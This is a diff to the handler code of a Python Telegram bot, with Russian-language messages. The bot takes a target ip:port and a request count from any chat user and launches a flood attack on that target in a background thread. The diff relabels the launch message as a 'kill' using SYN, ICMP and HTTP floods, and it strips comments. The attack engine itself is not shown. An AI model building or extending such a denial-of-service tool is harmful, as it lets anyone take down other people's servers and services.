@@ -24,7 +24,6 @@ def register_handlers(bot):
         if chat_id not in user_data:
             user_data[chat_id] = {}
 
-        # Этап 1: ждём ip:port
         if 'target' not in user_data[chat_id]:
             ip, port = parse_ip_port(text)
             if ip and is_valid_port(port):
@@ -33,7 +32,6 @@ def register_handlers(bot):
             else:
                 bot.send_message(chat_id, "❌ Неверный формат. Пиши как: 192.168.1.1:8080 или domain.com:443")
 
-        # Этап 2: ждём количество запросов
         elif 'count' not in user_data[chat_id]:
             try:
                 count = int(text)
@@ -42,20 +40,18 @@ def register_handlers(bot):
                     return
                 user_data[chat_id]['count'] = count
                 target = user_data[chat_id]['target']
-                bot.send_message(chat_id, f"🚀 Запускаем атаку на {target} с {count} запросами (все методы снос)")
+                bot.send_message(chat_id, f"🚀 ЗАПУСК УБИЙСТВА на {target} с {count} запросами (SYN+ICMP+HTTP)")
 
-                # Запуск в отдельном потоке, чтобы не блокировать бота
                 def run_attack():
                     loop = asyncio.new_event_loop()
                     asyncio.set_event_loop(loop)
                     engine = AttackEngine(max_threads=MAX_THREADS, timeout=TIMEOUT)
                     attack_engines[chat_id] = engine
-                    loop.run_until_complete(engine.single_attack(target, count, method='ALL'))
-                    bot.send_message(chat_id, f"✅ Атака завершена. Отправлено {count} запросов.")
+                    loop.run_until_complete(engine.single_attack(target, count))
+                    bot.send_message(chat_id, f"✅ Атака завершена. Отправлено {count} пакетов/запросов.")
 
                 thread = threading.Thread(target=run_attack)
                 thread.start()
-                # Чистим данные после старта
                 del user_data[chat_id]
 
             except ValueError:
